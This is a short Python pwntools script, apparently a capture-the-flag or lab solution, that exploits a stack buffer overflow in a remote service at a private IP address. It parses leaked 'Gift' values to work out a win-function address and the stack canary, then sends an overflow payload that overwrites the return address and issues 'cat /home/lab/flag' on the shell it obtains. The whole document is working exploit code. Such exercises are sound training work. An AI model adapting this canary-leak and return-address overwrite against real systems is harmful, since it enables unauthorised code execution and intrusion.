from pwn import *

r = remote('10.113.184.121', 10041)

gift = r.recvline().split(b"Gift: ")[1].split(b"\n")[0]

print(gift)

# movaps
win = int(gift, 16) + (0xf1 - 0xe9)

print(hex(win))

gift2 = r.recv(39).split(b"Gift2: ")[1]

print(gift2)

canary = gift2[8:16]

print(canary)

r.send(b'1' * 0x8 + canary + b'\0' * 8 + p64(win))
r.sendline(b'cat /home/lab/flag')
print(r.recv())
r.close()